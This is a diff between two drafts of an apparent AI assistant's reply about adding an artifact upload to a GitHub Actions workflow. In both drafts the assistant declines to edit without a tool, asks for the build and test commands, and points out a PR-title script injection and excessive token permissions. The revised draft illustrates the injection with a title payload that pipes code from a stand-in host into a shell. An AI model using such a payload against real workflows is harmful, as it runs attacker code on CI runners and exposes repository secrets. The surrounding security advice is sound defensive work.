@@ -1,34 +1,18 @@
-I didn't change anything. There are two reasons: I don't have a file-editing tool in this session, and the workflow doesn't match what the request assumes. This is the whole of `.github/workflows/deploy.yml`:
+I didn't change anything, for two reasons.
+
+**1. The workflow has no build or test steps.** `.github/workflows/deploy.yml` has only two steps: a checkout and an `echo` of the PR title. There's no build output to upload and no test step for the upload to follow. I'd have to make up the test command and the artifact path, and an upload pointing at a path that doesn't exist does nothing useful. Can you tell me:
+- the command that builds the project and the command that runs the tests
+- the path of the build output, such as `dist/` or `build/`
+
+**2. I don't have a file-editing tool in this session.** I can only read and search files, so you'd need to apply the change or give me a session where I can edit.
+
+Once I know those three things, the steps would look like this:
 
 ```yaml
-on:
-  pull_request:
-
-permissions: write-all
-
-jobs:
-  deploy:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - run: echo "Title is ${{ github.event.pull_request.title }}"
-```
-
-**There's no test or build step.** The job only checks out the code and prints the PR title. Nothing produces a build artifact, and no test runs before it, so there's nothing to upload yet. I need two things from you:
-- the build and test commands (for example `make test` / `make build`, or `npm test` / `npm run build`)
-- the path where the build output ends up
-
-**Draft of the change**, with placeholders where those answers go:
-
-```yaml
-    steps:
-      - uses: actions/checkout@v4
-      - name: Test
-        run: <test command>
-      - name: Build
-        run: <build command>
+      - run: <build command>
+      - run: <test command>
       - name: Upload build artifact
-        uses: actions/upload-artifact@v4   # pin to a full commit SHA
+        uses: actions/upload-artifact@<full-commit-SHA>  # v4
         with:
           name: build
           path: <build output path>
@@ -36,15 +20,15 @@ jobs:
           retention-days: 7
 ```
 
-By default, a step only runs if every step before it succeeded. So the upload runs only after the tests pass, without needing an `if:` condition.
+Steps run in order and the job stops at the first failure, so the upload only happens if the tests pass. No `if:` condition is needed. `if-no-files-found: error` makes the step fail if the path is wrong, instead of uploading nothing without complaint. Pin the action to a full commit SHA rather than `@v4`. I can't look up the current SHA from here.
 
-**Two security problems in this file you should know about:**
-1. **Script injection (line 14):** `${{ github.event.pull_request.title }}` is pasted directly into the shell command. Anyone who opens a PR can choose a title that runs their own commands. To fix it, pass the title in through an environment variable and use `"$PR_TITLE"` in the command:
-   ```yaml
-   - env:
-       PR_TITLE: ${{ github.event.pull_request.title }}
-     run: echo "Title is $PR_TITLE"
-   ```
-2. **`permissions: write-all`:** this gives the job's token write access to the whole repo. `permissions: contents: read` is enough for checkout, tests, build and the artifact upload.
+**Two security problems already in this workflow:**
+- **Line 14 lets a PR title run commands.** `${{ github.event.pull_request.title }}` is pasted straight into the shell script, so a PR titled something like `"; curl evil.sh | sh #` runs that code on the runner. To fix it, pass the title through an environment variable:
+  ```yaml
+      - env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
+        run: printf 'Title is %s\n' "$PR_TITLE"
+  ```
+- **Line 7 gives the job more access than it needs.** `permissions: write-all` grants the token write access to everything. A build, test and upload job only needs `contents: read`. Uploading artifacts doesn't need any extra token permission.
 
-Send me the build/test commands and the output path, and I'll give you the final file to paste in, including the security fixes if you want them.
+I'd also suggest pinning `actions/checkout@v4` to a commit SHA, and adding `persist-credentials: false` to that step so the git token isn't left on the runner.
